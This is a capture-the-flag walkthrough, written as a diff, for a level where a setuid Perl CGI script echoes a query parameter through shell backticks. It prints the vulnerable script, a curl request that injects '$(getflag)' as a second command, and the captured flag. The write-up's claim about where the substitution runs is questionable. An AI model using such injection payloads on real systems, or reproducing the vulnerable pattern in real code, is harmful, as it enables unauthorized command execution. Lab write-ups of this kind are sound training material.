@@ -1,0 +1,33 @@
+Doing a ls -l command in the level04 user directory displays one file!
+
+	-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+It's a perl script file, with flag04's permissions. So it seems that again, we won't
+actually need to connect to the flag04 account. Let's see what its code looks like!
+
+	#!/usr/bin/perl
+	# localhost:4747
+	use CGI qw{param};
+	print "Content-type: text/html\n\n";
+	sub x {
+  		$y = $_[0];
+  		print `echo $y 2>&1`;
+	}
+	x(param("x"));
+
+The code is pretty clear, there's a function called "x" that echoes its argument, and
+the script basically runs the function x with the parameter called x. Let's do a test:
+
+	curl 192.168.0.37:4747?x=test
+
+displays "test", just as expected.
+After some research, I come up with a way to make it echo what I want: we can run getflag
+in a subshell, and pass it as the x parameter!
+
+	curl "192.168.0.37:4747?x=$(getflag)"
+
+The program must first determine what getflag outputs - since level04.pl is launched as
+flag04, getflag will also have the correct rights. Then the perl scriptt will simply
+echo the output of the getflag command!
+
+	ne2searoevaevoem4ov4ar8ap
